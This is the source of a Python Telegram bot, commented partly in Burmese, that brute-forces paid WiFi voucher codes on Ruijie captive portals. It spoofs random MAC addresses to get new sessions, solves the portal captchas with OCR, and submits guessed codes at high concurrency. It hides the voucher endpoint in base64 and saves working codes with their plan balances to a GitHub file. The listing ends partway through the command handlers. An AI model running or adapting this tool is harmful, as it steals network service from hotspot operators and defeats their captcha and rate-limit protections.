import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid, itertools
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
from concurrent.futures import ThreadPoolExecutor
from aiolimiter import AsyncLimiter
from urllib.parse import urlparse
from datetime import datetime, timezone
import cv2, ddddocr, numpy as np

# ── uvloop (Railway/Linux အတွက် အမြန်ဆုံး) ──────────────────────────────
try:
    import uvloop
    uvloop.install()
except ImportError:
    pass

# ── Environment variables ─────────────────────────────────────────────────
BOT_TOKEN    = os.environ.get('BOT_TOKEN')
GITHUB_TOKEN = os.environ.get('GITHUB_TOKEN')
ADMIN_ID     = os.environ.get('ADMIN_ID')
REPO_OWNER   = os.environ.get('REPO_OWNER')
REPO_NAME    = os.environ.get('REPO_NAME')
DEBUG        = os.environ.get('DEBUG', '0') == '1'

# ── Tuning knobs (Railway plan အလိုက် ချိန်ညှိပါ) ─────────────────────
# Free plan (0.5GB RAM):  CONCURRENCY=50,  OCR_WORKERS=2, BATCH=100
# Hobby plan (8GB RAM):   CONCURRENCY=200, OCR_WORKERS=4, BATCH=200
CONCURRENCY  = int(os.environ.get('CONCURRENCY', '100'))
OCR_WORKERS  = int(os.environ.get('OCR_WORKERS', '3'))
BATCH_SIZE   = int(os.environ.get('BATCH_SIZE',  '150'))
RATE_PER_SEC = float(os.environ.get('RATE_PER_SEC', '30'))

# ── Global structures ─────────────────────────────────────────────────────
SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)

user_data        = {}
scan_tasks       = {}
success_texts    = {}
limited_texts    = {}
notify_setting   = {}
last_scan_params = {}
pending_brute    = {}
success_messages = {}
limited_messages = {}
DEFAULT_NOTIFY   = True

session       = None
_connector    = None
_voucher_sem  = None
_rate_limiter = None
_ocr_executor = None
_start_time   = time.monotonic()

# ── Security: domain whitelist ────────────────────────────────────────────
ALLOWED_DOMAINS = {"portal-mm-as.ruijienetworks.com", "portal-as.ruijienetworks.com"}
MAX_URL_LENGTH  = 2048

# ── Portal Configuration (Version-aware) ──────────────────────────────────
# ဒီနေရာမှာ portal version အလိုက် endpoint တွေကို သတ်မှတ်ထားပါတယ်။
# Script က အလိုအလျောက် စမ်းသပ်ပြီး အလုပ်လုပ်တဲ့ version ကို ရှာပါလိမ့်မယ်။
PORTAL_CONFIGS = {
    "portal-mm-as": {
        "domain": "portal-mm-as.ruijienetworks.com",
        "base_url": "https://portal-mm-as.ruijienetworks.com",
        "voucher_api": base64.b64decode(
            b'aHR0cHM6Ly9wb3J0YWwtbW0tYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
        ).decode(),
        "balance_api": "https://portal-mm-as.ruijienetworks.com/api/auth/balance/getBalance",
        "balance_api_fallback": "https://portal-mm-as.ruijienetworks.com/api/macc2/balance/getBalance",
        "captcha_image_api": "https://portal-mm-as.ruijienetworks.com/api/auth/captcha/image",
        "captcha_verify_api": "https://portal-mm-as.ruijienetworks.com/api/auth/captcha/verify",
        "referer_index": "https://portal-mm-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=",
        "referer_balance": "https://portal-mm-as.ruijienetworks.com/download/static/maccauth/src/balance.html?RES=./../expand/res/4ukmferxbdgmt3m49po&sessionId={token}&lang=en_US&redirectUrl=https://www.ruijienetwoacom&authTypeype=15",
    },
    "portal-as": {
        "domain": "portal-as.ruijienetworks.com",
        "base_url": "https://portal-as.ruijienetworks.com",
        "voucher_api": base64.b64decode(
            b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
        ).decode(),
        "balance_api": "https://portal-as.ruijienetworks.com/api/auth/balance/getBalance",
        "balance_api_fallback": "https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance",
        "captcha_image_api": "https://portal-as.ruijienetworks.com/api/auth/captcha/image",
        "captcha_verify_api": "https://portal-as.ruijienetworks.com/api/auth/captcha/verify",
        "referer_index": "https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=",
        "referer_balance": "https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?RES=./../expand/res/4ukmferxbdgmt3m49po&sessionId={token}&lang=en_US&redirectUrl=https://www.ruijienetwoacom&authTypeype=15",
    }
}
DEFAULT_PORTAL = "portal-mm-as"

# ── Version Detection ─────────────────────────────────────────────────────
# Portal version အလိုက် endpoint တွေကို သိရှိနိုင်တဲ့ helper
async def detect_portal_version(session_url, portal_config):
    """
    Portal version ကို စစ်ဆေးပါ။
    Return: "v1" (auth API) သို့မဟုတ် "v2" (macc2 API)
    """
    base = portal_config['base_url']
    # v2 endpoint ကို အရင်စမ်းပါ
    test_url = f"{base}/api/macc2/balance/getBalance/test"
    try:
        async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=5)) as r:
            if r.status in (200, 401, 403):
                return "v2"
    except Exception:
        pass
    # v1 endpoint ကို စမ်းပါ
    test_url2 = f"{base}/api/auth/balance/getBalance/test"
    try:
        async with session.get(test_url2, timeout=aiohttp.ClientTimeout(total=5)) as r:
            if r.status in (200, 401, 403):
                return "v1"
    except Exception:
        pass
    return "v1"  # default

def get_portal_config(session_url=None):
    if session_url:
        if "portal-mm-as" in session_url:
            return PORTAL_CONFIGS["portal-mm-as"], "portal-mm-as"
        elif "portal-as" in session_url:
            return PORTAL_CONFIGS["portal-as"], "portal-as"
    return PORTAL_CONFIGS[DEFAULT_PORTAL], DEFAULT_PORTAL

# ── Helpers ───────────────────────────────────────────────────────────────
def safe_log(*a):
    if DEBUG:
        print(*a)

def escape_md(t):
    if t is None:
        return ""
    t = str(t)
    for ch in ['_','*','`','[',']','(',')','~','>','#','+','-','=','|','{','}','.','!']:
        t = t.replace(ch, f'\\{ch}')
    return t

def validate_session_url(url):
    if not url or len(url) > MAX_URL_LENGTH:
        return False
    if any(ch in url for ch in ['<','>','"',"'",'\n','\r','\t',' ']):
        return False
    try:
        p = urlparse(url)
    except Exception:
        return False
    if p.scheme != "https":
        return False
    if p.hostname not in ALLOWED_DOMAINS:
        return False
    return True

def plan_to_minutes(s):
    if not s:
        return 0
    s = str(s).strip().lower()
    if s in ('unlimit','unlimited'):
        return float('inf')
    total = 0
    for val, unit in re.findall(r'(\d+)\s*(mo|min|h|d|m)\b', s):
        v = int(val)
        if unit == 'mo':   total += v * 30 * 24 * 60
        elif unit == 'd':  total += v * 24 * 60
        elif unit == 'h':  total += v * 60
        elif unit in ('min','m'): total += v
    return total

def _parse_seconds(val):
    try: secs = int(val)
    except Exception: return "N/A"
    h = secs // 3600; m = (secs % 3600) // 60
    if h: return f"{h}h {m}m"
    if m: return f"{m}m"
    return f"{secs}s"

def _parse_minutes(val):
    try: t = int(val)
    except Exception: return "N/A"
    if t <= 0: return "0m"
    if t < 60: return f"{t}m"
    h = t // 60; m = t % 60
    if h < 24: return f"{h}h {m}m" if m else f"{h}h"
    d = h // 24; rh = h % 24
    if d < 30: return f"{d}d {rh}h" if rh else f"{d}d"
    mo = d // 30; rd = d % 30
    return f"{mo}mo {rd}d" if rd else f"{mo}mo"

def _format_bytes(b):
    try:
        b = float(b)
        if b >= 1024**3: return f"{b/(1024**3):.3f} GB"
        if b >= 1024**2: return f"{b/(1024**2):.3f} MB"
        if b >= 1024:    return f"{b/1024:.3f} KB"
        return f"{b:.0f} B"
    except Exception:
        return "N/A"

def _format_quota(used, total):
    try:
        if isinstance(used, dict):
            up = used.get('up', used.get('upload', 0))
            dn = used.get('down', used.get('download', 0))
            tot = used.get('total', up + dn)
        else:
            tot = used; up = 0; dn = 0
        s = _format_bytes(tot)
        if up and dn:
            return f"{s}({_format_bytes(up)}↑ / {_format_bytes(dn)}↓)"
        return s
    except Exception:
        return "N/A"

# ── Web keep-alive ────────────────────────────────────────────────────────
async def handle(request):
    return web.Response(text="Bot is running 24/7!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('BOT_PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

# ── GitHub ────────────────────────────────────────────────────────────────
async def get_file_content(path):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    try:
        async with session.get(url, headers={"Authorization": f"token {GITHUB_TOKEN}"}) as r:
            if r.status == 200:
                d = await r.json()
                return json.loads(base64.b64decode(d['content']).decode()), d['sha']
    except Exception as e:
        safe_log(f"[get_file] {e}")
    return {}, None

async def update_file_content(path, content, sha, msg, retries=3):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}", "Content-Type": "application/json"}
    enc = base64.b64encode(json.dumps(content).encode()).decode()
    payload = {"message": msg, "content": enc, "sha": sha}
    for _ in range(retries):
        try:
            async with session.put(url, headers=headers, json=payload) as r:
                if r.status in (200, 201):
                    return await r.text()
                if r.status == 409:
                    _, new_sha = await get_file_content(path)
                    if new_sha:
                        payload["sha"] = new_sha
                        continue
                return await r.text()
        except Exception as e:
            safe_log(f"[update_file] {e}")
            await asyncio.sleep(1)
    return ""

# ── Balance (Version-aware) ───────────────────────────────────────────────
async def get_balance(token, portal_config, version="v1"):
    if not token:
        return {"time":"N/A","usage":"N/A","quota":"N/A","plan":"N/A","expire":"N/A"}

    # version အလိုက် API URL ကို ရွေးပါ
    if version == "v2":
        url = f"{portal_config['balance_api_fallback']}/{token}"
    else:
        url = f"{portal_config['balance_api']}/{token}"

    cookies = {'sensorsdata2015jssdkcross': '%7B%22distinct_id%22%3A%2219e460ef444507-091ef90c028745-1e462c6e-343089-19e460ef4452ab%22%7D'}
    headers = {
        'authority': portal_config['domain'],
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'content-type': 'application/json;',
        'referer': portal_config['referer_balance'].format(token=token),
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    try:
        async with session.get(url, headers=headers, cookies=cookies, timeout=aiohttp.ClientTimeout(total=10)) as r:
            raw = await r.text()

            # v1 မအောင်ရင် v2 ကို စမ်းပါ
            if r.status == 404 and version == "v1":
                alt = f"{portal_config['balance_api_fallback']}/{token}"
                async with session.get(alt, headers=headers, cookies=cookies, timeout=aiohttp.ClientTimeout(total=10)) as r2:
                    raw = await r2.text()
                    if r2.status != 200:
                        return {"time":"N/A","usage":"N/A","quota":"N/A","plan":"N/A","expire":"N/A"}
            elif r.status != 200:
                return {"time":"N/A","usage":"N/A","quota":"N/A","plan":"N/A","expire":"N/A"}

            try:
                data = json.loads(raw)
            except Exception:
                return {"time":"N/A","usage":"N/A","quota":"N/A","plan":"N/A","expire":"N/A"}

            result = {"time":"N/A","usage":"N/A","quota":"N/A","plan":"N/A","expire":"N/A"}
            cands = [data]
            for k in ('result','data'):
                if isinstance(data, dict) and isinstance(data.get(k), dict):
                    cands.append(data[k])

            for d in cands:
                if not isinstance(d, dict): continue
                for k in ['totalMinutes','remainingMinutes','remainMinutes','leftMinutes','balance','remaining']:
                    if d.get(k) is not None:
                        result["time"] = _parse_minutes(d[k]); break
                for k in ['remainingSeconds','remainTime','remainingTime','leftTime','timeLeft','remain_time']:
                    if d.get(k) is not None:
                        result["time"] = _parse_seconds(d[k]); break
                u = d.get('usage') or d.get('dataUsage') or d.get('traffic')
                if u:
                    result["usage"] = _format_quota(u) if isinstance(u, dict) else _format_bytes(u)
                q = d.get('quota') or d.get('dataQuota') or d.get('limit')
                sq = d.get('sessionQuota'); tq = d.get('totalQuota')
                if sq and tq:
                    result["quota"] = f"{_format_bytes(sq)} / {_format_bytes(tq)}"
                elif q:
                    result["quota"] = _format_bytes(q)
                p = d.get('plan') or d.get('planName') or d.get('internetPlan') or d.get('package')
                if p: result["plan"] = str(p)
                e = d.get('expireTime') or d.get('expiration') or d.get('expire') or d.get('validUntil')
                if e: result["expire"] = str(e)
            return result
    except Exception as e:
        safe_log(f"[get_balance] {e}")
        return {"time":"N/A","usage":"N/A","quota":"N/A","plan":"N/A","expire":"N/A"}

# ── Code iterator ─────────────────────────────────────────────────────────
def iter_codes(mode, length):
    if mode == 1:   chars = string.digits
    elif mode == 2: chars = string.ascii_lowercase
    elif mode == 3: chars = string.ascii_uppercase
    elif mode == 4: chars = string.ascii_letters
    elif mode == 5: chars = string.ascii_lowercase + string.digits
    else: raise ValueError(f"Invalid mode: {mode}")

    space = len(chars) ** length
    if space <= 500000:
        all_codes = ["".join(p) for p in itertools.product(chars, repeat=length)]
        random.shuffle(all_codes)
        for c in all_codes:
            yield c
    else:
        seen = set()
        while True:
            c = "".join(random.choice(chars) for _ in range(length))
            if c not in seen:
                seen.add(c)
                yield c

def format_progress(checked, speed, found, target=None):
    lines = [
        "📋 Status: Running",
        f"⚡ Speed: {speed:,.0f}/min",
        f"🔍 Checked: {checked:,}",
        f"💎 Found: {found}",
    ]
    if target:
        lines.append(f"🎯 Target: {found}/{target}")
    return "\n".join(lines)

# ── Captcha (dedicated OCR thread pool) ───────────────────────────────────
_ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3,3), 0)
    _, th = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buf = cv2.imencode('.png', th)
    res = _ocr.classification(buf.tobytes())
    return res.upper() if res else None

async def Captcha_Text(image_bytes):
    loop = asyncio.get_running_loop()
    return await loop.run_in_executor(_ocr_executor, _ocr_sync, image_bytes)

def get_mac():
    fb = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [fb] + [random.randint(0, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

def replace_mac(url, mac):
    return re.sub(r'(?<=mac=)[^&]+', mac, url)

async def get_session_id(sess, session_url, prev=None):
    url = replace_mac(session_url, get_mac())
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'referer': url,
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
    }
    try:
        async with sess.get(url, headers=headers, allow_redirects=True) as r:
            m = re.search(r"[?&]sessionId=([^&\s]+)", str(r.url))
            return m.group(1) if m else prev
    except Exception:
        return prev

async def Captcha_Image(sess, sid, pc):
    headers = {
        'authority': pc['domain'],
        'accept': 'image/avif,image/webp,image/apng,image/*,*/*;q=0.8',
        'referer': pc['referer_index'] + sid,
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    async with sess.get(pc['captcha_image_api'], params={'sessionId': sid, '_t': str(time.time())}, headers=headers) as r:
        return await r.read()

async def Varify_Captcha(sess, sid, text, pc):
    headers = {
        'authority': pc['domain'],
        'accept': '*/*',
        'content-type': 'application/json',
        'origin': pc['base_url'],
        'referer': pc['referer_index'] + sid,
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    try:
        async with sess.post(pc['captcha_verify_api'], headers=headers, json={'sessionId': sid, 'authCode': text}) as r:
            try:
                data = await r.json()
            except Exception:
                data = {}
            return sid if data.get("success") is True else None
    except Exception:
        return None

async def check_session_url(url):
    if not validate_session_url(url):
        return False
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'referer': url,
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36',
    }
    try:
        async with session.get(url, allow_redirects=True, headers=headers) as r:
            return "sessionId" in str(r.url)
    except Exception:
        return False

# ── Voucher check ─────────────────────────────────────────────────────────
async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None, plan_filters=None, version="v1"):
    if not recheck:
        cur = scan_tasks.get(chat_id)
        if not cur or cur.get("scan_id") != scan_id:
            return

    pc, pname = get_portal_config(session_url)
    post_url = pc['voucher_api']
    response = None
    session_id = None

    for attempt in range(3):
        async with aiohttp.ClientSession(
            connector=_connector,
            connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=aiohttp.ClientTimeout(total=30),
        ) as ts:
            session_id = await get_session_id(ts, session_url)
            if not session_id:
                continue

            auth_code = None
            for _ in range(6):
                try:
                    img = await Captcha_Image(ts, session_id, pc)
                    txt = await Captcha_Text(img)
                    if not txt:
                        continue
                    if await Varify_Captcha(ts, session_id, txt, pc):
                        auth_code = txt
                        break
                except Exception:
                    continue
            if not auth_code:
                continue

            if not recheck:
                cur = scan_tasks.get(chat_id)
                if not cur or cur.get("scan_id") != scan_id or cur.get("stop"):
                    return

            data = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": auth_code}
            headers = {
                "authority": pc['domain'],
                "accept": "*/*",
                "content-type": "application/json",
                "origin": pc['base_url'],
                "referer": pc['referer_index'] + session_id,
                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            try:
                async with ts.post(post_url, json=data, headers=headers) as r:
                    response = await r.text()
                    safe_log(f"[voucher] {code} a{attempt+1} status={r.status}")
            except Exception:
                return

        if response and 'request limited' in response:
            await asyncio.sleep(0.5)
            continue
        break

    if not response:
        return

    if 'logonUrl' in response:
        if recheck:
            return code
        plan_str = usage_str = quota_str = expire_str = "N/A"
        token = None
        try:
            rd = json.loads(response)
            lu = rd.get("result", {}).get("logonUrl", "") if isinstance(rd, dict) else ""
            tm = re.search(r'token=([^&]+)', lu)
            token = tm.group(1) if tm else None
            if not token:
                sm = re.search(r"[?&]sessionId=([^&\s]+)", lu)
                token = sm.group(1) if sm else session_id
            bi = await get_balance(token, pc, version)
            if isinstance(bi, dict):
                plan_str   = bi.get("plan", "N/A")
                usage_str  = bi.get("usage", "N/A")
                quota_str  = bi.get("quota", "N/A")
                expire_str = bi.get("expire", "N/A")
        except Exception as e:
            safe_log(f"[balance] {e}")

        if plan_filters:
            cm = plan_to_minutes(plan_str)
            if not any(cm >= plan_to_minutes(f) for f in plan_filters):
                return None

        if chat_id not in success_texts:
            success_texts[chat_id] = []
        success_texts[chat_id].append({
            "code": code, "session_id": session_id, "token": token,
            "plan": plan_str, "usage": usage_str, "quota": quota_str,
            "expire": expire_str, "portal": pname,
        })
        await SUCCESS_CODE.put({
            "chat_id": chat_id, "code": code, "session_id": session_id,
            "plan": plan_str, "usage": usage_str, "quota": quota_str,
        })

        if notify_setting.get(chat_id, DEFAULT_NOTIFY) and message:
            lines = []
            for it in list(success_texts[chat_id]):
                line = f"`{escape_md(it['code'])}` – ⏳ {escape_md(it.get('plan','N/A'))}"
                if it.get('usage') and it['usage'] != 'N/A':
                    line += f"\n   📊 {escape_md(it['usage'])}"
                if it.get('quota') and it['quota'] != 'N/A':
                    line += f" | 💾 {escape_md(it['quota'])}"
                if it.get('portal'):
                    line += f" | 🌐 {escape_md(it['portal'])}"
                lines.append(line)
            txt = "\n".join(lines)
            try:
                if chat_id not in success_messages:
                    m = await bot.send_message(chat_id, f"✅ Success Codes:\n{txt}", parse_mode="Markdown")
                    success_messages[chat_id] = m.message_id
                else:
                    await bot.edit_message_text(chat_id=chat_id, message_id=success_messages[chat_id],
                                                text=f"✅ Success Codes:\n{txt}", parse_mode="Markdown")
            except Exception:
                pass
        return code

    elif 'STA' in response:
        if chat_id not in limited_texts:
            limited_texts[chat_id] = []
        limited_texts[chat_id].append(code)
        if notify_setting.get(chat_id, DEFAULT_NOTIFY) and message:
            line = "\n".join(escape_md(c) for c in limited_texts[chat_id])
            try:
                if chat_id not in limited_messages:
                    m = await bot.send_message(chat_id, f"⚠️ Limited Codes:\n{line}")
                    limited_messages[chat_id] = m.message_id
                else:
                    await bot.edit_message_text(chat_id=chat_id, message_id=limited_messages[chat_id],
                                                text=f"⚠️ Limited Codes:\n{line}")
            except Exception:
                pass

# ── Brute runner ──────────────────────────────────────────────────────────
async def run_bruteforce(mode, length, chat_id, session_url, scan_id,
                         target=None, message=None, progress_msg=None, plan_filters=None, version="v1"):
    try:
        code_iter = iter_codes(mode, length)
    except ValueError as e:
        await bot.send_message(chat_id, str(e)); return

    checked = 0; found = 0
    scan_start = time.monotonic()
    should_exit = False

    try:
        while True:
            cur = scan_tasks.get(chat_id)
            if not cur or cur.get("scan_id") != scan_id:
                should_exit = True; break
            if cur.get("stop"):
                last_scan_params[chat_id] = {"mode": mode, "length": length,
                                             "target": target, "plan_filters": plan_filters or []}
                scan_tasks.pop(chat_id, None); should_exit = True; break

            batch = []
            for _ in range(BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    should_exit = True; break
            if not batch:
                break

            async def _check(c):
                async with _voucher_sem:
                    async with _rate_limiter:
                        return await perform_check(session_url, c, chat_id, scan_id,
                                                    message=message, plan_filters=plan_filters, version=version)

            results = await asyncio.gather(*[_check(c) for c in batch], return_exceptions=True)

            for r in results:
                if r:
                    found += 1
                    if target and found >= target:
                        try:
                            await progress_msg.edit_text("🎯 Target reached!")
                        except Exception: pass
                        scan_tasks.pop(chat_id, None)
                        last_scan_params.pop(chat_id, None)
                        should_exit = True; break

            if should_exit:
                break

            checked += len(batch)
            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            txt = format_progress(checked, speed, found, target)
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=txt)
            except Exception:
                try:
                    m = await bot.send_message(chat_id, txt)
                    progress_msg.message_id = m.message_id
                except Exception:
                    pass

        if progress_msg:
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id,
                                            text="✅ Scan completed.")
            except Exception:
                try: await bot.send_message(chat_id, "✅ Scan completed.")
                except Exception: pass
    finally:
        scan_tasks.pop(chat_id, None)

# ── GitHub scheduler ──────────────────────────────────────────────────────
async def github_update_scheduler():
    while True:
        await asyncio.sleep(80)
        items = []
        while not SUCCESS_CODE.empty():
            items.append(await SUCCESS_CODE.get())
        if items:
            try:
                results, sha = await get_file_content("result.json")
                if sha is None: results = {}
                for it in items:
                    cid = str(it["chat_id"]); code = it["code"]
                    results.setdefault(cid, [])
                    if code not in results[cid]:
                        results[cid].append({
                            "code": code, "plan": it.get("plan","N/A"),
                            "usage": it.get("usage","N/A"), "quota": it.get("quota","N/A"),
                        })
                await update_file_content("result.json", results, sha, "Periodic Update")
            except Exception as e:
                safe_log(f"scheduler: {e}")

# ── Commands ──────────────────────────────────────────────────────────────
@bot.message_handler(commands=['start'])
async def start(m):
    await bot.reply_to(m, "Bot စတင်ပါပြီ။ /help ဖြင့် အသုံးပြုနည်းကြည့်ပါ။")

@bot.message_handler(commands=['help'])
async def help_cmd(m):
    txt = (
        "📚 **Command လမ်းညွှန်**\n\n"
        "၁။ /setup <url>\n"
        "   (portal-mm-as သို့မဟုတ် portal-as URL)\n\n"
        "၂။ /brute <mode> <length> [target] [filters]\n"
        "   Mode:\n"
        "     1 = ဂဏန်းသီးသန့် (0-9)\n"
        "     2 = အင်္ဂလိပ်စာလုံးအသေး (a-z)\n"
        "     3 = အင်္ဂလိပ်စာလုံးအကြီး (A-Z)\n"
        "     4 = စာလုံးအကြီး+အသေး (a-zA-Z)\n"
        "     5 = စာလုံး+ဂဏန်း (a-z, 0-9)\n"
        "   ဥပမာ: /brute 1 6 5 1d,1h\n\n"
        "၃။ /status  – အခြေအနေ\n"
        "၄။ /stop    – ရပ်တန့်\n"
        "၅။ /resume  – ပြန်စ\n"
        "၆။ /saved   – ရလဒ်\n"
        "၇။ /delete_saved – ရလဒ်ဖျက်\n"
        "၈။ /recheck – ပြန်စစ်\n"
        "၉။ /notify  – Notify ON/OFF\n"
        "၁၀။ /testbalance – (Admin)"
    )
    await bot.reply_to(m, txt, parse_mode="Markdown")

@bot.message_handler(commands=['setup'])
async def handle_setup(m):
    a = m.text.split(maxsplit=1)
    if len(a) < 2:
        await bot.reply_to(m, "အသုံးပြုနည်း: /setup <url>"); return
    url = a[1].strip()
    if not validate_session_url(url):
        await bot.reply_to(m, "❌ URL မမှန်ကန်ပါ။\n• HTTPS ဖြစ်ရမည်\n• Ruijie portal domain ဖြစ်ရမည်")
        return
    await bot.reply_to(m, "Session URL စစ်ဆေးနေပါသည်...")
    if await check_session_url(url):
        cid = m.chat.id
        pc, pname = get_portal_config(url)
        # version detection
        version = await detect_portal_version(url, pc)
        user_data[cid] = {'session_url': url, 'portal_type': pname, 'version': version}
        for d in (success_texts, limited_texts, last_scan_params, pending_brute,
                  success_messages, limited_messages):
            d.pop(cid, None)
        try:
            results, sha = await get_file_content("result.json")
            if sha and str(cid) in results:
                del results[str(cid)]
                await update_file_content("result.json", results, sha, f"Clear {cid}")
        except Exception as e:
            safe_log(f"[setup] {e}")
        await bot.reply_to(m, f"✅ သိမ်းပြီး။\n🌐 Portal: {pname}\n📌 Version: {version}\n/brute ဖြင့် စတင်ပါ။")
    else:
        await bot.reply_to(m, "Session URL မှားနေပါသည်။")

@bot.message_handler(commands=['brute'])
async def brute(m):
    a = m.text.split()
    if len(a) < 3:
        await bot.reply_to(m, "/brute <mode> <length> [target] [filters]\nဥပမာ: /brute 1 6 5 1d,1h")
        return
    try:
        mode = int(a[1]); length = int(a[2])
        target = int(a[3]) if len(a) > 3 else None
        filters = a[4].split(',') if len(a) > 4 else []
        if mode not in [1,2,3,4,5]:
            await bot.reply_to(m, "❌ Mode 1-5 ဖြစ်ရမည်။"); return
        if not (1 <= length <= 12):
            await bot.reply_to(m, "❌ Length 1-12 ဖြစ်ရမည်။"); return
        if target is not None and target < 1:
            await bot.reply_to(m, "❌ Target 1 ထက်ကြီးရမည်။"); return
        if len(filters) > 10:
            await bot.reply_to(m, "❌ Filter ၁၀ ခုထက် မကျော်ရ။"); return
    except ValueError:
        await bot.reply_to(m, "❌ Mode/Length/Target ဂဏန်းဖြစ်ရမည်။"); return

    cid = m.chat.id
    if cid not in user_data or 'session_url' not in user_data[cid]:
        await bot.reply_to(m, "/setup ဖြင့် URL ထည့်ပါ။"); return

    if cid in last_scan_params:
        kb = InlineKeyboardMarkup()
        kb.add(InlineKeyboardButton("Resume", callback_data="resume_scan"),
               InlineKeyboardButton("New Scan", callback_data="new_scan"))
        pending_brute[cid] = {"mode": mode, "length": length, "target": target, "plan_filters": filters}
        prev = last_scan_params[cid]
        await bot.reply_to(m,
            f"ယခင် scan ရပ်ထား (mode {prev['mode']}, length {prev.get('length','?')}, target {prev['target']}).\nဆက်မလား၊ အသစ်မလား?",
            reply_markup=kb)
        return
    await start_brute_scan(cid, mode, length, target, m, filters)

async def start_brute_scan(cid, mode, length, target, orig_m, filters=None):
    filters = filters or []
    note = f" | Filter: {' / '.join(filters)}" if filters else ""
    pm = await bot.send_message(cid, f"Preparing...{note}")
    sid = str(uuid.uuid4())
    version = user_data[cid].get('version', 'v1')
    task = asyncio.create_task(run_bruteforce(
        mode, length, cid, user_data[cid]['session_url'], sid,
        target, message=orig_m, progress_msg=pm, plan_filters=filters, version=version))
    scan_tasks[cid] = {"task": task, "stop": False, "scan_id": sid}
    success_messages.pop(cid, None); limited_messages.pop(cid, None)

@bot.message_handler(commands=['stop'])
async def stop_scan(m):
    cid = m.chat.id
    d = scan_tasks.get(cid)
    if d:
        d["stop"] = True
        if not d["task"].done(): d["task"].cancel()
        await bot.reply_to(m, "Scan ရပ်ပြီ။ /resume ဖြင့် ပြန်စနိုင်။")
    else:
        await bot.reply_to(m, "ရပ်ရန် scan မရှိ။")

@bot.message_handler(commands=['resume'])
async def resume_cmd(m):
    cid = m.chat.id
    if cid not in last_scan_params:
        await bot.reply_to(m, "ယခင်ရပ်ထားသော scan မရှိ။"); return
    p = last_scan_params.pop(cid)
    await start_brute_scan(cid, p['mode'], p.get('length',6), p['target'], m, p.get('plan_filters', []))
    await bot.reply_to(m, "ပြန်စပါပြီ။")

@bot.callback_query_handler(func=lambda c: c.data in ["resume_scan","new_scan"])
async def cb_resume(c):
    cid = c.message.chat.id
    await bot.answer_callback_query(c.id)
    if c.data == "resume_scan":
        if cid not in last_scan_params:
            await bot.edit_message_text("Resume လုပ်ရန် မရှိ။", chat_id=cid, message_id=c.message.message_id); return
        p = last_scan_params.pop(cid)
        await bot.edit_message_text("ပြန်စပါပြီ။", chat_id=cid, message_id=c.message.message_id)
        await start_brute_scan(cid, p['mode'], p.get('length',6), p['target'], c.message, p.get('plan_filters', []))
    else:
        if cid in pending_brute:
            p = pending_brute.pop(cid); last_scan_params.pop(cid, None)
            await bot.edit_message_text("အသစ်စပါပြီ။", chat_id=cid, message_id=c.message.message_id)
            await start_brute_scan(cid, p['mode'], p.get('length',6), p['target'], c.message, p.get('plan_filters', []))
        else:
            await bot.edit_message_text("Command ပြန်ပို့ပါ။", chat_id=cid, message_id=c.message.message_id)

@bot.message_handler(commands=['saved'])
async def saved_codes(m):
